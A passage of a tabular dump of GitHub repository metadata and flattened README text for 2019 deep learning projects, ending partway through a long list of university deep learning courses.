submit an issue pull request Preview image https github com Fijiisland CellDeepLearning blob master AppPreview brightmode png image https github com Fijiisland CellDeepLearning blob master AppPreview darkmode png,2019-10-02T13:37:48Z,2019-12-12T14:44:33Z,C++,Fijiisland,User,1,2,3,78,master,Fijiisland,1,0,0,3,1,0,3
ioskn,mldl_htwg,n/a,mldlhtwg Code accompaning the Machine and Deep Learning Lectures,2019-09-30T11:48:49Z,2019-12-13T15:29:22Z,Jupyter Notebook,ioskn,Organization,2,2,4,42,master,oduerr#mof2,2,0,0,1,0,1,0
jjjj0458,Deep-Reinforcement-Learning-for-Solving-Job-Shop-Scheduling-Problems,n/a,Deep Reinforcement Learning for Solving Job Shop Scheduling Problems In the past decades many optimization methods have been devised and applied to job shop scheduling problem JSSP to find the optimal solution Most methods assume that the scheduling results are applied to static environments However the whole environments in the real word are always dynamic and many unexpected events make original solutions to fail In this essay we view JSSP as a sequential decision making problem and propose to use deep reinforcement learning model to tackle this problem Th e combination of deep learning and reinforcement learning avoids to handcraft features as used in traditional reinforcement learning and it is expected that the combination will make the whole learning phase more efficient Our proposed model consists of actor network and critic network and both networks include convolution layers and fully connected layer Ac tor network let agent learn how to behave in different situations while critic network help agent evaluate the value of statement t hen return to ac tor network The whole network is trained with parallel training on a multi agent environment a nd different simple dispatching rules are considered as actions We evaluate our proposed model on more than ten instances that are present in a famous benchmark problem library OR library The evaluation results indicate that no matter in static JSSP benchmark problem or in stochastic JSSP our method can compete with other alternatives,2019-09-24T14:15:38Z,2019-11-25T04:27:01Z,Python,jjjj0458,User,2,2,5,18,master,jjjj0458,1,0,0,1,0,0,0
ladangol,DeepLearning_Tensorflow,n/a,DeepLearningTensorflow This repo is for practicing deep learning algorithms using Tensorflow and Keras Project details dogsvscats Dogs vs Cats classification project using keras and tensorflow To monitor training tensorboard is used The model can be learned from scratch or using transfer learning Class activation maps are implemented to visualize the focus of the convolutional layers dogsbreeds Different dogs breeds classifcation project using only tensorflow not Keras dogscatsbreeds The goal of this project is to build a model with two outputs that shares the convolutional layers The outputs of the models are dogs and cats classification and dogs breeds classifcaion Each classification uses its own loss function imdbsentimentanalysis A sentiment analaysis project on IMDB movie reviews using word embbeding and RNN,2019-09-22T19:45:33Z,2019-11-20T16:25:21Z,Python,ladangol,User,1,2,2,65,master,ShiNik#ladangol,2,0,0,0,0,0,19
ishfaq06,Supervised-Deep-Learning-for-Radio-Resource-Allocation,n/a,Supervised Deep Learning for Radio Resource Allocation Data Generation The training and testing data is generated through simulation To generate data run python datagenerator py Training and Testing To train and test the model run python main py,2019-10-29T14:54:23Z,2019-11-18T05:11:49Z,Python,ishfaq06,User,1,2,3,15,master,ishfaq06,1,0,0,0,0,0,0
Duxing-Studio,Deep-Learning-Workshop-2019,n/a,2019 2019 About png,2019-09-26T13:32:14Z,2019-11-08T08:28:35Z,TeX,Duxing-Studio,Organization,1,2,3,22,master,mwsht#flying-czx,2,0,0,0,0,0,2
milovanovic,DL-WS,n/a,Binder https mybinder org badgelogo svg https mybinder org v2 gh milovanovic DL WS master Deep Learning Workshop Notebooks for the Deep Learning Workshop held on 1st Friday 2nd Saturday and 3rd Sunday November 2019 in Belgrade,2019-10-31T17:54:46Z,2019-11-06T18:15:40Z,Jupyter Notebook,milovanovic,User,1,2,2,3,master,milovanovic,1,0,0,0,0,0,0
MoosaAK,DeepLearning2.2,n/a,,2019-10-07T13:58:13Z,2019-10-15T16:05:23Z,n/a,MoosaAK,User,1,2,0,0,master,,0,0,0,0,0,0,0
ruchawaghulde,Facial-Keypoints-Detection,n/a,Facial Keypoints Detection A Google Collab Project By Luis Siddharth and Rucha EE 628 A Deep Learning Final Project using PyTorch The link https www kaggle com c facial keypoints detection overview MOTIVATION Our reason for choosing this project is primarily based on our interest in applying deep learning to significant problems currently prevelant in the industry Facial recognition is a very popular biometric technique these days Various developments have already been observed in facial recognition technologies but there is still a huge scope and a need for improvement We are excited about applying the applications of Facial Key Points Detection as a building block in several applications such as tracking faces in images and videos Analysing Facial Expressions Detecting Dysmorphic Facial Signs for Medical Diagnosis and Biometrics Face Recognition Detecting facial keypoints is a challenging problem given the variations in both facial features as well as image conditions Facial features may differ according to size position pose and expression while image qualtiy may vary with illumination and viewing angle These variations in combination with the necessity for highly accurate coordinate predictions e g the exact corner of an eye have lead us to believe that through this project we will be gaining insights about a deep and an interesting topic We specifically chose the Facial Keypoint Detection project because it will give us an opportunity to experiment with a wide variety of deep learning approaches work with different neural networks and solve the problems associated with it INTRODUCTION In this project we have addressed the problem proposed above by creating a model that can detect the facial features from the image dataset The main goal is to obtain the coordinates of eyes eyebrows nose and mouth in the picture These coordinates are known as keypoints In order to be more specific about the location and orientation of these keypoints it will be necessary in some cases to assign more than one keypoint for each facial feature This way the face of the subject can be perfectly defined For this dataset our model will provide the following keypoints 1 Eyes For both eyes the model will predict three coordinates corresponding to the center inner and outer parts of the eyes 2 Eyebrows For this feature the model will yield two coordinates corresponding to the inner and outer side for both of the eyebrows 3 Nose In this case one coordinate will be enough 4 Mouth For the last feature the model will give four coordinates corresponding to the left right top and bottom part of the lip This way the computer could actually read the mood of the subject In the past few years advancements in Facial Key Points detection have been made by the application of Deep Convolutional Neural Network DCNN DCNNs have helped build state of the art models for image recognition recommender systems natural language processing etc Our intention is to make use of these architectures to address this problem trying to use different algorithms to study which are more suitable for the proposed task DATA FILES The data files which we have used are as follows training csv list of training 7049 images Each row contains the x y coordinates for 15 keypoints and image data as row ordered list of pixels train https user images githubusercontent com 50252196 68026058 e20e9580 fc84 11e9 94d8 fc8106f5cc76 png test csv list of 1783 test images Each row contains ImageId and image data as row ordered list of pixels submissionFileFormat csv list of 27124 keypoints to predict Each row contains a RowId ImageId FeatureName Location FeatureName are lefteyecenterx righteyebrowouterendy etc Location is what you need to predict IMPLEMENTATION PLAN We have used PyTorch to implement our project along with libraries such as numpy pandas matplotlib etc will be used based on our project requirements The implementation workflow will be as follows 1 EDA and Feature Engineering Importing the data Importing the json file from Kaggle which contain the username and the key for our Kaggle account To link our Kaggle account to Google Collab create a new API token on your Kaggle account Creating a client by making a directory to host our Kaggle API token After this step use kaggle competitions download c facial keypoints detection API to import the csv and folders from the data source on Kaggle Finally decompress these folders to obtain our csv files Data Pre processing Using Pandas create data frames for our csv files and extract features which can be used in our analysis Since our data contains some missing values this step involves calculating visualizing and replacing those missing values for every feature We have also used heat maps by Seaborn for finding the correlation between features Then we spilt the training into keypoints and images Each row of keypoints data contains the x y coordinates for 15 keypoints while that of images data contains the row ordered list of pixels Visualizing the input image Creating a numpy array of the pixel values in the image column of our training dataset Using matplotlib to plot the image from these pixel values Using features such as lefteyecenterx nosetipx etc to plot keypoints on face images Formulating a gaussian function to create heatmaps of these facial keypoints 2 Training For training the algorithms which we have used are CNN and LeNet We have chosen RELU to be our Activation function and our Optimizer function is Adam used to minimize the loss function associated with this data 3 Predictions After training our model using CNN and LeNet we have evaluated our predictions using the test dataset helping us find how our loss function behaves over time With these initial observations We have also used used these models to predict keypoints on images from the internet 4 Visualizing the predictions We have finally visualized our predicted outputs to see predicted facial keypoints on the given face images Extending further with this implementation we tried to take our own input image which is not necessarily a face image We took an input image which contains a group of people Haar cascade classifier is used for face detection in this image as shown in figure Now we have detected the face images from our input image we resized the face images so that it would fit our project requirements Finally we have applied our trained CNN and ResNet model to these detected face images We successfully achieved facial keypoints detection of these images as shown in figure So now we can use any image and locate keypoints on it APPLICATIONS Some of the applications of Facial Keypoints Detection are as follows Prevent Retail Crime Find Missing People Protect Law Enforcement Smarter Advertising Security for Phones Deep Fake,2019-11-01T16:01:42Z,2019-12-02T13:47:11Z,Jupyter Notebook,ruchawaghulde,User,1,2,2,59,master,ruchawaghulde#LuisOlCo#siddh30,3,0,0,0,0,0,0
alphacoder01,Deep-Learning,n/a,Deep Learning This repo will contain the complete implementaion of deep L layered neural networks and of other projects Contains both ipynb and py files for each code,2019-10-08T17:13:48Z,2019-10-23T07:27:18Z,Jupyter Notebook,alphacoder01,User,1,2,0,16,master,alphacoder01,1,0,0,0,0,0,0
SAMEERA-DS,DATA-SCIENCE,n/a,DATA SCIENCE DATA SCIENCE PROJECTS In this repo I working on various Machine Learning Algorithms i Classification Algorithms a Logistic Regression b SVM Support Vector Machine c Decision Trees d KNN K Nearest Neighbours e Random Forests f Naive Bayes and Various Algorithms ii Prediction Algorithms a Discriminant Analysis Linear Fixed Regularised Quadratic b CART Classification and Regression Trees c PART Probability and Regression Trees d C4 5 e Random Forest Regession and various methods iii Clustering Segmentation Algorithms a K Means Clustering b Apriori Algorithm Requirements 1 Jupyter Notebook 2 Python Packages i Numpy ii Pandas iii Matplotlib iv Seaborn v Sci Kit learn SkLearn Machine learning,2019-10-16T04:36:27Z,2019-10-22T07:37:46Z,Jupyter Notebook,SAMEERA-DS,User,1,2,0,6,master,SAMEERA-DS,1,0,0,0,0,0,0
AccessDenied1,Deep-Learning-project,n/a,Deep Learning project This Repo contains the details about my internship project done in summer of 2019 Click here https bit ly 2Mz0cGi to see Certificate Click here https bit ly 2kh86Ze to see Internship Report About Industry Cadla Services Private Limited is a stealth mode AI startup helping micro retailers compete in the digital economy using big data and AI CADLA stands for Consumer Analytics with Deep Learning Algorithms Brands Cadla helps brands take advantage of AI and cognitive neuroscience to decode complex consumer behavior and help them develop targeted messaging to improve conversions Retailers Cadla platform helps micro retailers with big data and artificial intelligence Smaller retail stores transform themselves to compete effectively in the digital economy by providing superior customer experience to consumers Supply Chain Cadla helps in supply chain with smoother logistics using big data and AI Our platform will help ensure a smooth flow of goods from the manufacturer to retail Website http www cadlasys org Industry Retail Company size 2 10 employees Headquarters Singapore Singapore Type Privately Held Founded 2018 Disclaimer and Notices Resources in this repository can be used only for academic purpose It s commercial use is strictly prohibited,2019-10-19T06:05:02Z,2019-11-15T07:44:00Z,Jupyter Notebook,AccessDenied1,User,1,2,0,5,master,AccessDenied1,1,0,0,0,0,0,0
LuxiWang99,490_Deep_Learning,n/a,CSE 490G1 Deep Learning Project Files for CSE 490G Final Project Cailin Winston Luxi Wang Mitchell Estberg cailinw louis99 estbergm uw dot edu Any midi or wav files are in data Project Proposal Questions What is the problem you are trying to solve Why is this a cool problem to work on What data do you plan to use Do you need to gather and label it or does the data already exist What approaches are you planning to try How can you make your project 10 cooler with 1 extra work Hint live demos Project Proposal Response We want to make a classifier for classical music We will explore classifying for music period https www naxos com education briefhistory asp Baroque Classical Romantic Modern etc and perhaps for composers as well It is an interesting classification problem as there is variation amongst these styles that with a traditional model or classification program would require human feature selection from domain experts There are even many humans that struggle with this classification task and upon hearing a new piece may have a hard time identifying the period it originated from it takes years of music and theory study to classify these periods accurately However we hope to train a neural net that can handle this classification problem There are hundreds of classical music midi Musical Instrument Digital Interface https en wikipedia org wiki MIDI files available on the internet from various sources piano midi http www piano midi de maestro https magenta tensorflow org datasets maestro musedata https musedata org that we plan to use as data Most of these are sorted by composer which we will have to then write a labeling script to derive period from composer We will have to carefully handle some edge cases of composers that wrote accross multiple periods We intend to convert the midi files to wav Waveform Audio File Format https en wikipedia org wiki WAV to a Mel frequency cepstrum https en wikipedia org wiki Mel frequencycepstrum MFC which can be classified as an image classification problem with the low number of classes of classical music periods or the higer number of classes and more challenging problem of composers We would love to try a live demo where we record some samples of performances and test our model on these recordings Set Up 1 First clone this repo git clone https github com LuxiWang99 490DeepLearning git cd 490DeepLearning 2 Next set up the environment The environments name will be testenv conda env create f environment yml conda activate testenv 3 Now run our lab py to download our data and run main python src lab py,2019-10-19T23:09:04Z,2019-12-05T07:17:46Z,Python,LuxiWang99,User,2,2,0,31,master,estberg#LuxiWang99,2,0,0,0,0,0,1
GEOpython-suvro,Deep_Learning_MIT_Lexfridman,n/a,DeepLearningMITLexfridman,2019-09-23T15:16:09Z,2019-09-28T14:26:48Z,Jupyter Notebook,GEOpython-suvro,User,1,2,0,28,master,GEOpython-suvro,1,0,0,0,0,0,0
FabianGroeger96,docker-deep-learning,deep-learning#docker#docker-file#docker-image,docker deep learning A Docker Image for Deep Learning with Python 3 Start the container bash docker run it name python deep learning v PWD home notebooks p 8888 8888 p 5001 6006 d rm python deep learning Port 8888 used for jupyter notebook Port 5001 user for tensorboard Connect to bash on container bash docker exec it python deep learning bin bash Open Jupyter Notebook Open this link localhost 8888 http localhost 8888 in your browser and start working on your notebook Stop the container bash docker stop python deep learning,2019-10-17T09:41:19Z,2019-12-10T06:48:48Z,Dockerfile,FabianGroeger96,User,1,2,0,14,master,FabianGroeger96,1,0,0,0,0,0,0
yi1397,Deep_Learning_Study,n/a,keras,2019-09-25T10:14:15Z,2019-11-26T13:48:50Z,Jupyter Notebook,yi1397,User,1,2,0,37,master,yi1397,1,0,0,0,0,0,0
gaonanlee,Deep-Learning-Experiments,n/a,,2019-10-09T23:53:31Z,2019-12-12T03:40:54Z,Jupyter Notebook,gaonanlee,User,2,2,1,6,master,gaonanlee,1,0,0,0,0,0,0
MoosaAK,Deep-Learning-IMBD-Modle,n/a,,2019-10-09T15:40:03Z,2019-10-15T16:05:20Z,Jupyter Notebook,MoosaAK,User,1,2,0,1,master,MoosaAK,1,0,0,0,0,0,0
MoosaAK,Projects-Deep-Learning,n/a,,2019-10-16T15:41:51Z,2019-11-22T12:22:26Z,Jupyter Notebook,MoosaAK,User,1,2,0,2,master,MoosaAK,1,0,0,0,0,0,0
diffusioncon,Distributed-Deep-Learning-Sovrin,n/a,Team 43 Distributed Deep learning DID acts This repo has been forked from Hyperledger Aries Cloud agent link https github com hyperledger aries cloudagent python provided by British Columbia Government We have created a set of agents that can be run using docker to experiment with a federated deep learning scenario using didCOMM to pass secure messages between the participants e g the ML model parameters Furthermore the scenario explores using credentials so that participants can verify that who they are communicating with In the example this is verifying a hospital is indeed a hospital and a researcher has been accredited by a regulator However the credentials abnd issuers within this use case could be adapted to any ecosystem The agents connect by default to the BC government development instance of Hyperledger Indy ledger link http dev bcovrin vonx io Guide Full Aries Scenario images initialidea png To run the scenario git clone git github com diffusioncon Distributed Deep Learning Sovrin git cd demo Hospital gets verified by the NHS Trust Trust Issues to Hospital images TrusttoHospital png 1 Start the NHS Trusted agent rundemo nhsheadoffice 2 Start one of the hospitals rundemo hospital1 3 Use NHS s invitation URL to connect the hospital to it 4 Trust requests proof of hospitals name Self attested 5 NHS Trust issue verified hospital credential to the Hospital The Researcher gets accredited by the regulatory authority Researcher accreditation images regulatortocoordinator png 6 Start the Coordinator rundemo coordinator 7 Start the regulator rundemo regulator 8 Follow the on screen menu on the coordinator 4 to input connection url from the regulator 9 Follow the on screen menu to Issue a credential from the Regulator to the Coordinator The researcher validates the hospital s credential The hospital validates the researcher s accreditation The training procedure starts Researcher and hospital verify respective credentials images coordinatorandhospital png 10 Follow the on screen menu on the Coordinator 3 to create New Invitation for the hospital 11 Follow the on screen menu in the hospital terminal to accept the new invitation link from the coordinator and connect to it 12 Follow the on screen menu so the coordinator can check the hospital s credentials If proof is valid the coordinator adds this hospital to the list of the trusted connections 13 Follow the on screen menu to check from the hospital terminal the coordinator s credentials 14 After the hospitall has been added to the coordinator s trusted list can be start the training process by accepting the model from the coordinator trains the model and sends back the updated model updated model parameters to the coordinator Afterwards coordinator sends the new updated model to the next hospital to continue the training until the full training procedure has been completed Researcher coordinates federated learning images federatedlearning png Created by Will Abramson Adam James Hall Pavlos Papadopoulos,2019-10-20T10:58:14Z,2019-12-02T18:59:06Z,Python,diffusioncon,Organization,4,2,1,1313,master,andrewwhitehead#nrempel#ianco#swcurran#esune#wip-abramson#TelegramSam#sklump#WadeBarnes#dbluhm#rosenbrockc#AlexITC#jljordan42#jordanmmck#ryjones#theoturner#dappsec#dongwangdw,18,0,0,0,0,0,0
bangpc,Deep-Learning-Materials,n/a,Deep Learning Materials Deep learning material that I collected from many source when I studied Deep Learning,2019-10-16T16:19:02Z,2019-11-05T11:07:57Z,Jupyter Notebook,bangpc,User,1,2,0,13,master,bangpc,1,0,0,0,0,0,0
deeptricks,deeptricks,best-practices#deep-learning#machine-learning,deeptricks Deep Learning Tips and Tricks,2019-09-26T02:35:01Z,2019-09-27T06:56:56Z,n/a,deeptricks,Organization,1,2,0,3,master,michalwols,1,0,0,1,0,1,0
MoosaAK,DeepLearning-Reuters_3.5.1-3.5.7,n/a,,2019-10-09T15:49:11Z,2019-10-15T16:05:18Z,Jupyter Notebook,MoosaAK,User,1,2,0,1,master,MoosaAK,1,0,0,0,0,0,0
buchan123,deeprl-minesweeper,n/a,Minesweeper GymEnvironment This is an implementation of the minesweeper game as a gym environment It can be used to make the computer learn playing the Minesweeper game,2019-09-25T15:25:07Z,2019-12-13T16:11:49Z,Python,buchan123,User,1,2,0,2,master,buchan123,1,0,0,0,0,0,0
DaveLorenz,FlaskDeepLearningHamSpam,n/a,FlaskDeepLearningHamSpam A CNN to classify texts as ham or spam amp model serving using Flask See our article published on Towards Data Science https towardsdatascience com spam predictor using convolutional neural networks and flask bb94f5c54a35 source friendslink sk 47de79cb3e817fb30ebe268b20565a31,2019-10-21T21:01:02Z,2019-12-03T15:15:42Z,Jupyter Notebook,DaveLorenz,User,1,2,0,12,master,DaveLorenz,1,0,0,0,0,1,1
CUAI-Deeplearning,Deep-Learning-from-Scratch2,n/a,Deep Learning from Scratch2 2 10 00 15 00 CHAPTER CHAPTER freethrow CHAPTER CHAPTER freethrow 1 2 3 word2vec 4 word2vec 5 RNN 6 RNN 7 RNN 8 2 1 RNN RNN 2 1 RNN,2019-09-21T09:48:06Z,2019-10-14T10:00:10Z,Jupyter Notebook,CUAI-Deeplearning,Organization,1,2,1,60,master,alopui#kkole3897#statslove#leeje008#Jin0316,5,0,0,0,0,0,0
jiajunhua,kmario23-deep-learning-drizzle,n/a,balloon tada Deep Learning Drizzle confettiball balloon books Read enough so you start developing intuitions and then trust your intuitions and go for it https www deeplearning ai hodl geoffrey hinton books Prof Geoffrey Hinton University of Toronto heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign Contents heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign Deep Learning Deep Neural Networks arrowheadingdown https github com kmario23 deep learning drizzle tada deep learning deep neural networks confettiball balloon Probabilistic Graphical Models arrowheadingdown https github com kmario23 deep learning drizzle loudspeaker probabilistic graphical models foundation for graph neural networks sparkles Machine Learning Fundamentals arrowheadingdown https github com kmario23 deep learning drizzle cupid machine learning fundamentals cyclone boom Natural Language Processing arrowheadingdown https github com kmario23 deep learning drizzle hibiscus natural language processing more applied cherryblossom sparklingheart Optimization for Machine Learning arrowheadingdown https github com kmario23 deep learning drizzle cupid optimization for machine learning cyclone boom Automatic Speech Recognition arrowheadingdown https github com kmario23 deep learning drizzle speakinghead automatic speech recognition speechballoon thoughtballoon General Machine Learning arrowheadingdown https github com kmario23 deep learning drizzle cupid general machine learning cyclone boom Modern Computer Vision arrowheadingdown https github com kmario23 deep learning drizzle fire modern computer vision cameraflash moviecamera Reinforcement Learning arrowheadingdown https github com kmario23 deep learning drizzle balloon reinforcement learning hotsprings videogame Boot Camps or Summer Schools arrowheadingdown https github com kmario23 deep learning drizzle star2 boot camps or summer schools mapleleaf Bayesian Deep Learning arrowheadingdown https github com kmario23 deep learning drizzle gamedie bayesian deep learning spades gem Medical Imaging arrowheadingdown https github com kmario23 deep learning drizzle moviecamera medical imaging camera videocamera Graph Neural Networks arrowheadingdown https github com kmario23 deep learning drizzle tada graph neural networks geometric dl confettiball balloon Bird s eye view of Artificial Intelligence arrowheadingdown https github com kmario23 deep learning drizzle bird birds eye view of agi eagle heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign tada Deep Learning Deep Neural Networks confettiball balloon heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign S No Course Name University Instructor s Course WebPage Lecture Videos Year 1 Neural Networks for Machine Learning Geoffrey Hinton University of Toronto Lecture Slides http www cs toronto edu hinton courseraslides html CSC321 tijmen https www cs toronto edu tijmen csc321 YouTube Lectures https www youtube com playlist list PLoRl3Ht4JOcdU872GhiYWf6jwrkSNhz9 UofT mirror https www cs toronto edu hinton courseralectures html 2012 2014 2 Neural Networks Demystified Stephen Welch Welch Labs Suppl Code https github com stephencwelch Neural Networks Demystified YouTube Lectures https www youtube com playlist list PLiaHhY2iBX9hdHaRr6b7XevZtgZRa1PoU 2014 3 Deep Learning at Oxford Nando de Freitas Oxford University Oxford ML http www cs ox ac uk teaching courses 2014 2015 ml YouTube Lectures https www youtube com playlist list PLE6Wd9FR EfW8dtjAuPoTuPcqmOV53Fu 2015 4 Deep Learning for Perception Dhruv Batra Virginia Tech ECE 6504 https computing ece vt edu f15ece6504 YouTube Lectures https www youtube com playlist list PL fZD610i7yAsfH2eLBiRDa90kL2ML0f7 2015 5 Deep Learning Ali Ghodsi University of Waterloo STAT 946 https uwaterloo ca data analytics deep learning YouTube Lectures https www youtube com playlist list PLehuLRPyt1Hyi78UOkMPWCGRxGcA9NVOE F2015 6 CS231n CNNs for Visual Recognition Andrej Karpathy Stanford University CS231n http cs231n stanford edu 2015 None 2015 7 CS224d Deep Learning for NLP Richard Socher Stanford University CS224d http cs224d stanford edu YouTube Lectures https www youtube com playlist list PLmImxx8Char8dxWB9LRqdpCTmewaml96q 2015 8 Bay Area Deep Learning Many legends Stanford None YouTube Lectures https www youtube com playlist list PLrAXtmErZgOfMuxkACrYnD2fTgbzk2THW 2016 9 CS231n CNNs for Visual Recognition Andrej Karpathy Stanford University CS231n http cs231n stanford edu 2016 YouTube Lectures https www youtube com playlist list PLkt2uSq6rBVctENoVBg1TpCC7OQi31AlC Academic Torrent https academictorrents com details 46c5af9e2075d9af06f280b55b65cf9b44eb9fe7 2016 10 Neural Networks Hugo Larochelle Universit de Sherbrooke Neural Networks http info usherbrooke ca hlarochelle neuralnetworks content html YouTube Lectures https www youtube com playlist list PL6Xpj9I5qXYEcOhn7TqghAJ6NAPrNmUBH Academic Torrent https academictorrents com details e046bca3bc837053d1609ef33d623ee5c5af7300 2016 11 CS224d Deep Learning for NLP Richard Socher Stanford University CS224d http cs224d stanford edu YouTube Lectures https www youtube com playlist list PLlJy eBtNFt4CSVWYqscHDdP58M3zFHIG Academic Torrent https academictorrents com details dd9b74b50a1292b4b154094b7338ec1d66e8894d 2016 12 CS224n NLP with Deep Learning Richard Socher Stanford University CS224n http web stanford edu class cs224n YouTube Lectures https www youtube com playlist list PL3FW7Lu3i5Jsnh1rnUwqTcylNr7EkRe6 2017 13 CS231n CNNs for Visual Recognition Justin Johnson Stanford University CS231n http cs231n stanford edu 2017 YouTube Lectures https www youtube com playlist list PL3FW7Lu3i5JvHM8ljYj zLfQRF3EO8sYv Academic Torrent https academictorrents com details ed8a16ebb346e14119a03371665306609e485f13 2017 14 Topics in Deep Learning Ruslan Salakhutdinov CMU 10707 https deeplearning cmu 10707 github io YouTube Lectures https www youtube com playlist list PLpIxOj HnDsOSLBuy7UEVQkyfhHapa F2017 15 Deep Learning Crash Course Leo Isikdogan UT Austin None YouTube Lectures https www youtube com playlist list PLWKotBjTDoLj3rXBL nEIPRN9V3a9Cx07 2017 16 Deep Learning and its Applications Franois Piti Trinity College Dublin EE4C16 https github com frcs 4C16 2017 YouTube Lectures https www youtube com playlist list PLIo1iEzl5iB9NkulNR0X5vXN8AaEKglWT 2017 17 Deep Learning Andrew Ng Stanford University CS230 http cs230 stanford edu YouTube Lectures https www youtube com playlist list PLoROMvodv4rOABXSygHTsbvUz4GYQhOb 2018 18 UvA Deep Learning Efstratios Gavves University of Amsterdam UvA DLC https uvadlc github io Lecture Videos https uvadlc github io lectures sep2018 html 2018 19 Advanced Deep Learning and Reinforcement Learning Many legends DeepMind None YouTube Lectures https www youtube com playlist list PLqYmG7hTraZDNJre23vqCGIVpfZK2RZs 2018 20 Machine Learning Peter Bloem Vrije Universiteit Amsterdam MLVU https mlvu github io YouTube Lectures https www youtube com playlist list PLCof9EqayQgsORO3pFzeYZFz6cszYO0VJ 2018 21 Deep Learning Francois Fleuret EPFL EE 59 https fleuret org ee559 2018 dlc Video Lectures https fleuret org ee559 2018 dlc materials 2018 22 Introduction to Deep Learning Alexander Amini Harini Suresh and others MIT 6 S191 http introtodeeplearning com YouTube Lectures https www youtube com playlist list PLtBw6njQRU rwp57C0oIVt26ZgjG9NI 2017 version https www youtube com playlist list PLkkuNyzb8LmxFutYuPA7B4oiMn6cjD6Rs 2017 2019 23 Deep Learning for Self Driving Cars Lex Fridman MIT 6 S094 https selfdrivingcars mit edu YouTube Lectures https www youtube com playlist list PLrAXtmErZgOeiKm4sgNOknGvNjby9efdf 2017 2018 24 Introduction to Deep Learning Bhiksha Raj and many others CMU 11 485 785 http deeplearning cs cmu edu YouTube Lectures https www youtube com playlist list PLp 0K3kfddPwJBJ4Q8We 0yNQEG0fZrSa S2018 25 Introduction to Deep Learning Bhiksha Raj and many others CMU 11 485 785 http deeplearning cs cmu edu YouTube Lectures https www youtube com playlist list PLp 0K3kfddPyH44FP0dl0CbYprvTcfgOI Recitation Inclusive https www youtube com playlist list PLLR0ZOlbfD6KDBq93G8 guHI J1ICeFm F2018 26 Deep Learning Specialization Andrew Ng Stanford DL AI https www deeplearning ai deep learning specialization YouTube Lectures https www youtube com channel UCcIXc5mJsHVYTZR1maL5l9w playlists 2017 2018 27 Deep Learning Ali Ghodsi University of Waterloo STAT 946 https uwaterloo ca data analytics teaching deep learning 2017 YouTube Lectures https www youtube com playlist list PLehuLRPyt1HxTolYUWeyyIoxDabDmaOSB F2017 28 Deep Learning Mitesh Khapra IIT Madras CS7015 https www cse iitm ac in miteshk CS7015 html YouTube Lectures https www youtube com playlist list PLyqSpQzTE6M9gCgajvQbc68HkJKGBAYT 2018 29 Deep Learning for AI UPC Barcelona DLAI 2017 https telecombcn dl github io 2017 dlai DLAI 2018 https telecombcn dl github io 2018 dlai YouTube Lectures https www youtube com playlist list PL 5eMc3HQTBagIUjKefjcTbnXC0wXCvd 2017 2018 30 Deep Learning Alex Bronstein and Avi Mendelson Technion CS236605 https vistalab technion github io cs236605 info YouTube Lectures https www youtube com playlist list PLM0a6Z788YAZuqg2Ip dPLzEd33lZvP2 2018 31 MIT Deep Learning Many Researchers Lex Fridman MIT 6 S094 6 S091 6 S093 https deeplearning mit edu YouTube Lectures https www youtube com playlist list PLrAXtmErZgOeiKm4sgNOknGvNjby9efdf 2019 32 Deep Learning Book companion videos Ian Goodfellow and others DL book slides https www deeplearningbook org lectureslides html YouTube Lectures https www youtube com playlist list PLsXu9MHQGs8df5A4PzQGw kfviylC R9b 2017 33 Theories of Deep Learning Many Legends Stanford Stats 385 https stats385 github io YouTube Lectures https www youtube com playlist list PLwUqqMt5en7fFLwSDa9V3JIkDam WWgqy first 10 lectures F2017 34 Neural Networks Grant Sanderson None YouTube Lectures https www youtube com playlist list PLZHQObOWTQDNU6R167000DxZCJB 3pi 2017 2018 35 CS230 Deep Learning Andrew Ng Kian Katanforoosh Stanford CS230 http cs230 stanford edu YouTube Lectures https www youtube com playlist list PLoROMvodv4rOABXSygHTsbvUz4GYQhOb A2018 36 Theory of Deep Learning Lots of Legends Canary Islands DALI 18 http dalimeeting org dali2018 workshopTheoryDL html YouTube Lectures https www youtube com playlist list PLeCNfJWZKqxtWBnV8gefGqmmPgz9YF4LR 2018 37 Introduction to Deep Learning Alex Smola UC Berkeley Stat 157 http courses d2l ai berkeley stat 157 index html YouTube Lectures https www youtube com playlist list PLZSO6 bSqHQHBCoGaObUljoXAyyqhpFW S2019 38 Deep Unsupervised Learning Pieter Abbeel UC Berkeley CS294 158 https sites google com view berkeley cs294 158 sp19 home YouTube Lectures https www youtube com channel UCf4SX8kAZMoGcZjMREsU9w videos S2019 39 Machine Learning Peter Bloem Vrije Universiteit Amsterdam MLVU https mlvu github io YouTube Lectures https www youtube com playlist list PLCof9EqayQgupldnTvqNyBThTcME5r93 2019 40 Deep Learning on Computational Accelerators Alex Bronstein and Avi Mendelson Technion 